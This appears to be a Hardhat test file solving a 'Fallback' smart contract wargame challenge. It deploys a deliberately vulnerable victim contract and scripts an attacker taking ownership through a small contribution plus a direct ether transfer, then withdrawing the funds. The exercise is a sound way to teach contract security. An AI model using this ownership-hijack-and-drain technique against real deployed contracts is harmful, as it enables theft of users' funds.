const { expect } = require("chai")
const { ethers } = require("hardhat");
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");

describe("Challenge 1 - Fallback", function() {

    async function deployAllContractsFixture() {
        const [deployer, attacker] = await ethers.getSigners();
        const initialVictimFunds = "1000.0"

        const Victim = await ethers.getContractFactory("FallbackVictim")
        const victim = await Victim.deploy()
        await victim.deployed()

        return {initialVictimFunds, deployer, attacker, victim}
    }

    describe("Initial State", function() {
        it("Should deploy victim correctly", async function() {
            const {deployer, victim} = await loadFixture(deployAllContractsFixture)

            expect(victim.deployTransaction.from).to.equal(deployer.address)
            expect(await victim.owner()).is.equal(deployer.address)
        })

        it("Should assign all funds to victim ", async function() {
            const {initialVictimFunds, deployer, victim} = await loadFixture(deployAllContractsFixture)
            const victimBalance = await victim.connect(deployer).getContribution()

            expect(ethers.utils.formatEther(victimBalance)).to.equal(initialVictimFunds)
        })

        it("Should verify attacker is not owner", async function() {
            const {victim, attacker} = await loadFixture(deployAllContractsFixture)

            expect(await victim.owner()).not.equal(attacker.address)
        })
    })

    describe("Attack Execution", function() {
        it("Should change ownership to attacker", async function() {
            const {deployer, victim, attacker} = await loadFixture(deployAllContractsFixture)
            const contributionValue = "0.00001"
            await victim.connect(attacker).contribute({value: ethers.utils.parseEther(contributionValue)})
            const attackerContribution = await victim.connect(attacker).getContribution()

            expect(ethers.utils.formatEther(attackerContribution)).to.equal(contributionValue)

            await attacker.sendTransaction({to:victim.address, value:ethers.utils.parseEther(contributionValue)})

            expect(await victim.owner()).is.equal(attacker.address)

            await victim.connect(attacker).withdraw()
        })
    })
})